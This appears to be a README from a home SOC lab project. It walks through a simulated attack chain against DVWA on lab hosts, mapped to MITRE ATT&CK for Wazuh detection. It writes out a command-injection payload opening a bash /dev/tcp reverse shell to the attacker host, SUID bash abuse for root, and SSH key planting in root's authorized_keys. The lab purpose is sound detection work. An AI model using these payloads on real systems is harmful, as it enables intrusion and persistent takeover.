## Operation Watering Hole: End-to-End Detection Engineering

A simulated attack chain demonstrating Linux endpoint detection via Wazuh FIM and auditd, mapped to MITRE ATT&CK.

## Threat Scenario

| Phase | Technique | MITRE ID |
|-------|-----------|----------|
| Initial Access | Command Injection | T1059 |
| Execution | Reverse Shell via bash `/dev/tcp` | T1059 |
| Privilege Escalation | SUID Binary Abuse | T1548 |
| Persistence | SSH Public Key Planting | T1098.004 |


### Detection Coverage
This repository implements detection logic for each phase using:
- **Wazuh** for real-time endpoint telemetry (Sysmon integration)
- **MITRE ATT&CK** mapping for threat-informed prioritization

### Validation
Every rule was tested against live events in a Proxmox-based SOC lab
with VLAN-segmented networks (VLAN 10 internal, VLAN 30 DMZ).
---

## Initial Access: DVWA Command Injection

**Target:** `http://10.0.0.103/dvwa/vulnerabilities/exec/`  
**Security Level:** Low  

### Payload

```bash
|| bash -c 'bash -i &gt;& /dev/tcp/10.0.0.50/1234 0&gt;&1'

```
![commandinjection.png](https://github.com/Pahoeh0e/SOC_Home_Lab/blob/main/Operations/Screenshots/dvwa-command-injection.png)

Then on the attacker:

``` bash
nc -lvp 1234

```
![listener.png](https://github.com/Pahoeh0e/SOC_Home_Lab/blob/main/Operations/Screenshots/nc-lvp-listener-www-data-access.png)


### Bash shell Upgrade 
Initial reverse shell lacked TTY. Upgrade via:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
(Ctrl+Z to background)
```bash
stty raw -echo; fg
```
![upgradingshell.png](https://github.com/Pahoeh0e/SOC_Home_Lab/blob/main/Operations/Screenshots/upgrading-shell-www-data.png)


## Privilege Escalation
After Initial Access find out what privileges the user has via:

```bash
whoami
id
cat /etc/passwd
sudo su
cd /root

```

([catpasswd.png]https://github.com/Pahoeh0e/SOC_Home_Lab/blob/main/Operations/Screenshots/www-data-cat-etc-passwd.png)


### Exploiting misconfiguration
DVWA runs as www-data with /usr/sbin/nologin. To simulate the full attack chain create a misconfiguration as root, a SUID bash binary on the victim host, so the attacker can exploit to gain root privileges:

``` bash
cp /bin/bash /usr/local/bin/suidbash
chmod u+s /usr/local/bin/suidbash
```

![misconfiguration.png](https://github.com/Pahoeh0e/SOC_Home_Lab/blob/main/Operations/Screenshots/bash-shell-suid-victim.png)

From reverse shell:

```bash
/usr/local/bin/suidbash -p -c "whoami; id"
```

![whoamiroot.png](https://github.com/Pahoeh0e/SOC_Home_Lab/blob/main/Operations/Screenshots/www-data-suid-vulnerability-whoami.png)



### Persistence
With privilege escalation, plant SSH public key for persistence:

```bash
/usr/local/bin/suidbash -p -c "echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... attacker_key" >> /root/.ssh/authorized_keys"
```
![exploitsuid.png](https://github.com/Pahoeh0e/SOC_Home_Lab/blob/main/Operations/Screenshots/suid-persistence-ssh-authorized-keys.png)

> **Note:** The text looks skewed and jumbled but it initialled showed the ssh key to be inside the /.ssh/authorized_keys directory

Verify from attacker host:
``` bash
ssh -i ~/.ssh/pivot_key root@10.0.0.103

```


